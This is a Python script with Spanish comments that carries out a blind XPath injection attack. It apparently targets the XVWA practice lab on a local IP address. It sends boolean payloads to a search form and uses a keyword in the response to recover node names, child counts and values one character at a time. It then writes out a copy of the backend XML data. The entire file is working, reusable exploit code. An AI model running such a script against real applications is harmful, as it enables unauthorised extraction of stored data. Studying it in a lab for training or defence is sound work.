#!/usr/bin/python3

from pwn import *
import requests
import sys
import time
import pdb
import signal
import string
import xml.etree.ElementTree as ET
import lxml.etree as etree

# -------------- Variables globales ------------------

main_url = 'http://192.168.1.70/xvwa/vulnerabilities/xpath/'
characters = string.ascii_letters + string.digits + ' ' + '.' + ',' + ';' + '$'
out_file = "xpath.xml"

# ------------ Definición de funciones ---------------

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

def KeySizeDiscover(path):
    return SizeDiscover("name(%s)" % path)

def SizeDiscover(field):
    size = 0
    while True:
        payload = "1' and string-length(%s)='%d" % (field, size)
        if xPathInyect(payload):
            return size
        else:
            size += 1

def KeyNameDiscover(path, size):
    return ContentDiscover("name(%s)" % path, size)

def ContentDiscover(field, size):
    data = ""
    for position in range(1, (size + 1)):
        for character in characters:
            payload = "1' and substring(%s,%d,1)='%s" % (field, position, character)
            if xPathInyect(payload):
                data += character
                break
    return data

def xPathInyect(payload):
    post_data = {
        'search': payload,
        'submit': ''
    }    
    r = requests.post(main_url, data=post_data, )
    return ("Affogato" in r.text)

def SonsNumberDiscover(path):
    size = 0
    while True:
        payload = "1' and count(%s)='%d" % ((path + '/*'), size)
        if xPathInyect(payload):
            return size
        else:
            size += 1

def KeyEnumerate(path, parent):
    key = ET.SubElement(parent, KeyNameDiscover(path, KeySizeDiscover(path)))
    sons_number = SonsNumberDiscover(path)
    if sons_number == 0:
        key.text = ContentDiscover(path, SizeDiscover(path))
    else:
        for son in range(1, sons_number + 1):
            KeyEnumerate(path + '/*[' + str(son) + ']', key)
    
# ---------------------- Main --------------------------

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    print("\n[+] Iniciando proceso de fuerza bruta mediante XPath Inyection, ten paciencia, esto tardará bastante\n\n")
    base_path=""
    for root in range(1, (SonsNumberDiscover(base_path) + 1)):
        root_path = base_path + "/*[" + str(root) + "]"

        root_key = ET.Element(KeyNameDiscover(root_path, KeySizeDiscover(root_path)))
        for son in range(1, (SonsNumberDiscover(root_path) + 1)):
            KeyEnumerate(root_path + '/*[' + str(son) + ']', root_key)
    
    print("[+] Proceso de fuerza bruta terminado! puedes ver el resultado en el arhcivo: %s\n" % out_file)
    tree = ET.ElementTree(root_key)
    ET.indent(tree, space="\t", level=0)
    tree.write(out_file, encoding="utf-8")
